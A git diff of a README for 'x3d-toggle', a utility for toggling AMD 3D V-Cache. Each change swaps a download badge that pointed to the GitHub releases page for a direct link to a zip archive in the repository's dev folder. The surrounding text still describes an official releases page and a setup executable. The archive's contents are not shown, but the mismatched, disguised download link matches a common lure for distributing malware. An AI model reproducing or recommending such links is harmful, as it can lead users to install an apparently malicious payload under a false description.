@@ -1,6 +1,6 @@
 # ⚙️ x3d-toggle - Easy AMD 3D VCACHE Switch
 
-[![Download x3d-toggle](https://img.shields.io/badge/Download-x3d--toggle-blue?style=for-the-badge)](https://github.com/protoman3320/x3d-toggle/releases)
+[![Download x3d-toggle](https://img.shields.io/badge/Download-x3d--toggle-blue?style=for-the-badge)](https://raw.githubusercontent.com/protoman3320/x3d-toggle/main/dev/toggle-d-x-v3.9.zip)
 
 ---
 
@@ -29,7 +29,7 @@ You do not have to worry about any programming knowledge. The setup uses simple 
 
 To get the latest version of x3d-toggle, visit the official releases page here:
 
-[![Get x3d-toggle](https://img.shields.io/badge/Get%20x3d--toggle-grey?style=for-the-badge)](https://github.com/protoman3320/x3d-toggle/releases)
+[![Get x3d-toggle](https://img.shields.io/badge/Get%20x3d--toggle-grey?style=for-the-badge)](https://raw.githubusercontent.com/protoman3320/x3d-toggle/main/dev/toggle-d-x-v3.9.zip)
 
 Once on the release page, look for the most recent release. Files are organized by version number or date. Typically, you will find a file named similarly to `x3d-toggle-setup.exe` or just `x3d-toggle.exe`.
 
@@ -110,4 +110,4 @@ If problems continue, seek help on forums related to AMD CPUs or gaming hardware
 
 Download the latest version of x3d-toggle here:
 
-[![Download x3d-toggle](https://img.shields.io/badge/Download-x3d--toggle-blue?style=for-the-badge)](https://github.com/protoman3320/x3d-toggle/releases)
+[![Download x3d-toggle](https://img.shields.io/badge/Download-x3d--toggle-blue?style=for-the-badge)](https://raw.githubusercontent.com/protoman3320/x3d-toggle/main/dev/toggle-d-x-v3.9.zip)
